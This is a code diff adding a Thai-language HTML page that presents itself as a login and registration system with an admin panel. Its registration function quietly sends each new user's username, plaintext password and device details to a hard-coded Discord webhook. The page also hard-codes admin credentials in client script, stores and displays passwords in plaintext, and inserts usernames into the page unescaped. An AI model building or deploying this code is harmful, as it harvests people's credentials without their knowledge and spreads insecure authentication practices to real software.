@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Auth & Admin System</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        body, html { height: 100%; margin: 0; font-family: 'Kanit', sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
+        #home-page, #admin-page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; padding: 20px; box-sizing: border-box; }
+        .page-label { font-size: 2rem; font-weight: bold; color: #5865F2; margin-bottom: 20px; }
+        .logout-btn-top { position: absolute; top: 20px; right: 20px; width: auto !important; padding: 10px 20px !important; margin: 0 !important; background-color: #f04747 !important; font-size: 0.9rem !important; cursor: pointer; border: none; border-radius: 5px; color: white; font-weight: bold; }
+        .auth-card { background: #2f3136; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 400px; text-align: center; z-index: 10; }
+        .hidden { display: none; }
+        input { width: 100%; padding: 12px; margin: 8px 0 2px 0; border-radius: 5px; border: 1px solid #202225; background: #202225; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #5865F2; }
+        #name-status { display: block; text-align: left; font-size: 0.75rem; margin-bottom: 8px; height: 15px; }
+        .status-valid { color: #43b581; }
+        .status-invalid { color: #f04747; }
+        button { width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 5px; background-color: #5865F2; color: white; cursor: pointer; font-weight: bold; font-size: 1rem; }
+        button:hover { background-color: #4752c4; }
+        .switch-mode { font-size: 0.9rem; margin-top: 15px; color: #b9bbbe; cursor: pointer; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2f3136; border-radius: 8px; overflow: hidden; font-size: 0.9rem; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #202225; }
+        th { background-color: #5865F2; color: white; }
+        .btn-delete { background: #f04747; padding: 5px 10px; font-size: 0.8rem; width: auto; margin: 0; }
+        #welcome-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #121212; justify-content: center; align-items: center; z-index: 99; }
+        .welcome-text { font-size: 4rem; font-weight: bold; text-align: center; opacity: 0; transform: scale(0.8); animation: welcomeFade 2.5s ease-in-out forwards; }
+        @keyframes welcomeFade { 0% { opacity: 0; transform: scale(0.8); filter: blur(10px); } 40%, 60% { opacity: 1; transform: scale(1); filter: blur(0px); } 100% { opacity: 0; transform: scale(1.1); filter: blur(5px); } }
+    </style>
+</head>
+<body>
+
+    <div id="welcome-screen">
+        <div class="welcome-text" id="welcome-msg"></div>
+    </div>
+
+    <div id="home-page">
+        <div class="page-label">HOME</div>
+        <button class="logout-btn-top" onclick="location.reload()">ออกจากระบบ</button>
+        <div style="text-align:center; margin-top:100px;"><h1>ยินดีต้อนรับเข้าสู่ระบบ</h1></div>
+    </div>
+
+    <div id="admin-page">
+        <div class="page-label">ADMIN PANEL</div>
+        <button class="logout-btn-top" onclick="location.reload()">ออกจากระบบ</button>
+        <h3>รายชื่อผู้สมัครและอุปกรณ์ที่ใช้</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>ลำดับ</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>อุปกรณ์ (Device Info)</th>
+                    <th>จัดการ</th>
+                </tr>
+            </thead>
+            <tbody id="user-table-body"></tbody>
+        </table>
+    </div>
+
+    <div id="auth-container" class="auth-card">
+        <div id="login-form">
+            <h2>เข้าสู่ระบบ</h2>
+            <input type="text" id="l-user" placeholder="ชื่อบัญชี">
+            <input type="password" id="l-pass" placeholder="รหัสผ่าน">
+            <button onclick="login()">เข้าสู่ระบบ</button>
+            <p class="switch-mode" onclick="toggle()">ยังไม่มีบัญชี? สมัครสมาชิกที่นี่</p>
+        </div>
+        <div id="register-form" class="hidden">
+            <h2>สมัครสมาชิก</h2>
+            <input type="text" id="r-user" placeholder="ชื่อบัญชี (5 ตัวขึ้นไป)" oninput="checkUsername()">
+            <small id="name-status"></small> 
+            <input type="password" id="r-pass" placeholder="รหัสผ่าน (6 ตัวขึ้นไป)">
+            <input type="password" id="r-confirm" placeholder="ยืนยันรหัสผ่าน">
+            <button onclick="register()">สมัครสมาชิก</button>
+            <p class="switch-mode" onclick="toggle()">มีบัญชีอยู่แล้ว? เข้าสู่ระบบ</p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482780179976814642/CL9RXaEDWLtKAHRmXQ6wMuqv-kbztJOtyXrjdJ6HpNksm0srTuA9hoFbolQktTwK8TUa';
+        const ADMIN_CONFIG = { user: "admin", pass: "123456" };
+
+        // ฟังก์ชันดึงข้อมูลอุปกรณ์
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "PC / Desktop";
+            if (/Android/i.test(ua)) device = "Android Phone";
+            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS Device";
+            
+            // พยายามดึงชื่อรุ่นคร่าวๆ จาก UserAgent
+            const match = ua.match(/\(([^)]+)\)/);
+            const model = match ? match[1].split(';')[0] : "Unknown Model";
+            
+            return `${device} (${model})`;
+        }
+
+        function toggle() {
+            document.getElementById('login-form').classList.toggle('hidden');
+            document.getElementById('register-form').classList.toggle('hidden');
+            document.getElementById('name-status').innerText = "";
+        }
+
+        function checkUsername() {
+            const user = document.getElementById('r-user').value.trim();
+            const statusLabel = document.getElementById('name-status');
+            let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            if (user.length === 0) { statusLabel.innerText = ""; return; }
+            if (user.length < 5) { statusLabel.innerText = "❌ สั้นเกินไป"; statusLabel.className = "status-invalid"; return false; }
+            if (users.some(u => u.username === user) || user === ADMIN_CONFIG.user) { statusLabel.innerText = "❌ ชื่อนี้ถูกใช้แล้ว"; statusLabel.className = "status-invalid"; return false; }
+            statusLabel.innerText = "✅ ใช้งานได้"; statusLabel.className = "status-valid"; return true;
+        }
+
+        async function register() {
+            const user = document.getElementById('r-user').value.trim();
+            const pass = document.getElementById('r-pass').value;
+            const confirm = document.getElementById('r-confirm').value;
+            const deviceInfo = getDeviceInfo(); // ดึงข้อมูลเครื่องทันทีที่สมัคร
+
+            if (!checkUsername()) return alert('เช็คชื่อบัญชีอีกครั้ง');
+            if (pass.length < 6 || pass !== confirm) return alert('รหัสผ่านไม่ถูกต้อง');
+
+            let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            users.push({ username: user, password: pass, device: deviceInfo });
+            localStorage.setItem('my_users', JSON.stringify(users));
+
+            // ส่งไป Discord พร้อมข้อมูลอุปกรณ์
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📱 สมาชิกใหม่สมัครสมาชิก!",
+                            color: 5814783,
+                            fields: [
+                                { name: "👤 User", value: `\`${user}\``, inline: true },
+                                { name: "🔑 Pass", value: `\`${pass}\``, inline: true },
+                                { name: "🛠 อุปกรณ์", value: `\`${deviceInfo}\`` }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            } catch (e) {}
+
+            startWelcome(user, false);
+        }
+
+        function login() {
+            const user = document.getElementById('l-user').value.trim();
+            const pass = document.getElementById('l-pass').value;
+            if (user === ADMIN_CONFIG.user && pass === ADMIN_CONFIG.pass) return startWelcome("ADMIN", true);
+            let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            const match = users.find(u => u.username === user && u.password === pass);
+            if (match) startWelcome(user, false);
+            else alert('ข้อมูลผิดพลาด');
+        }
+
+        function startWelcome(username, isAdmin) {
+            document.getElementById('auth-container').style.display = 'none';
+            const screen = document.getElementById('welcome-screen');
+            document.getElementById('welcome-msg').innerHTML = `WELCOME<br><span style="color:#5865F2">${username}</span>`;
+            screen.style.display = 'flex';
+            setTimeout(() => {
+                screen.style.display = 'none';
+                if (isAdmin) showAdminPanel();
+                else document.getElementById('home-page').style.display = 'block';
+            }, 2500);
+        }
+
+        function showAdminPanel() {
+            document.getElementById('admin-page').style.display = 'block';
+            const tableBody = document.getElementById('user-table-body');
+            tableBody.innerHTML = "";
+            let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            users.forEach((u, index) => {
+                tableBody.innerHTML += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${u.username}</td>
+                    <td>${u.password}</td>
+                    <td>${u.device || "ไม่มีข้อมูล"}</td>
+                    <td><button class="btn-delete" onclick="deleteUser(${index})">ลบ</button></td>
+                </tr>`;
+            });
+        }
+
+        function deleteUser(index) {
+            if(confirm("ลบบัญชีนี้?")) {
+                let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+                users.splice(index, 1);
+                localStorage.setItem('my_users', JSON.stringify(users));
+                showAdminPanel();
+            }
+        }
+    </script>
+</body>
+</html>
